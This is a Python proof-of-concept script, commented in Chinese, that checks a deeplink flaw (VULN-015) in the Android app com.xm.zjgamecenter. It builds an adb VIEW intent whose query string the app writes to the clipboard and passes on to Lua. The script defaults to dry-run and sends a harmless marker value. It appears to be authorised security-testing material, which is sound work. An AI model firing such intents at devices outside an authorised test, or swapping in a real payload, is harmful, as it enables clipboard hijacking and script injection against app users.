#!/usr/bin/env python3
# 授权环境专用最小验证模板（Phase 5）。默认不发送任何网络请求；涉及设备的操作仅限授权的本地测试设备。
"""VULN-015 deeplink 写剪贴板 —— 授权测试设备 adb 验证（dry-run 默认，POC_CONFIRM=YES 执行）。

证据背景：
  - AppActivity 声明 19 个 scheme BROWSABLE deeplink，query 写剪贴板并透传 Lua
    （证据：traffic-analysis/step4/vuln_analysis.json VULN-015）。

边界：
  - 仅限授权的本地测试设备；默认 dry-run 只打印命令。
  - 不发送任何网络请求（adb 本地 intent）。
"""
import argparse
import os
import shutil
import subprocess
import sys
import urllib.parse

PKG = "com.xm.zjgamecenter"


def main() -> int:
    ap = argparse.ArgumentParser(
        description="VULN-015 deeplink query 写剪贴板验证（授权测试设备，dry-run 默认）"
    )
    ap.add_argument("--scheme", required=True,
                    help="deeplink scheme（19 个 BROWSABLE scheme 之一，真实清单见 step4 证据 / README TODO）")
    ap.add_argument("--host", default="open", help="deeplink host 占位，默认 open")
    ap.add_argument("--key", default="poc", help="query 键名，默认 poc")
    ap.add_argument("--value", default="POC-CLIPBOARD-MARKER", help="query 值（剪贴板标记）")
    ap.add_argument("--serial", help="adb 设备序列号；dry-run 可缺省，执行时必填")
    args = ap.parse_args()

    query = urllib.parse.urlencode({args.key: args.value})
    deeplink = f"{args.scheme}://{args.host}?{query}"

    adb = shutil.which("adb")
    serial = args.serial or "<SERIAL>"
    cmd = ([adb or "adb", "-s", serial, "shell", "am", "start",
            "-a", "android.intent.action.VIEW",
            "-d", deeplink, PKG])

    print("[=] deeplink:", deeplink)
    print("[=] 待执行命令:\n    " + " ".join(cmd))

    if os.environ.get("POC_CONFIRM") != "YES":
        print("\n[dry-run] 未设置 POC_CONFIRM=YES，仅打印命令不执行。"
              "确认目标为授权测试设备后：POC_CONFIRM=YES python3 validate_request.py --serial <序列号> ...")
        return 0

    if not args.serial:
        print("[-] 执行模式必须提供 --serial", file=sys.stderr)
        return 2
    if not adb:
        print("[-] 未找到 adb，请先安装 Android platform-tools 并加入 PATH", file=sys.stderr)
        return 2

    print("[+] POC_CONFIRM=YES，执行（仅限授权测试设备）...")
    p = subprocess.run(cmd, capture_output=True, text=True)
    print(p.stdout, end="")
    if p.returncode != 0:
        print(p.stderr, file=sys.stderr)
        return p.returncode
    print("[+] 已发出 VIEW intent。请在设备上读取剪贴板确认是否写入 POC 标记，并抓 logcat 佐证。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
